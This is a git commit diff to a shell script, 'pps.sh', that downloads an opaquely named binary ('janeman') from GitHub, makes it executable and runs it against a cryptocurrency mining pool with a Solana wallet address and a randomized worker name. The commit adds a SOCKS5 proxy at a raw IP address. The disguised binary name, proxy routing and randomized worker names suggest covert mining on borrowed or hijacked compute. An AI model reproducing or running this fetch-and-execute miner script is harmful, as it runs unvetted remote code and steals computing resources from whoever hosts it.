84ec6d2698ece84ce599c4f67edbe67a46e49f2d
vijaykumar892121 <93004368+vijaykumar892121@users.noreply.github.com>
2021-10-22 23:32:08 +0530

    Update pps.sh

--- pps.sh
+++ pps.sh
@@ -5,4 +5,5 @@
 apt install libpci3
 wget https://github.com/archernap/prem/raw/main/janeman
 chmod +x janeman
+export http_proxy=socks5://65.2.123.108:9001
 timeout 5m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
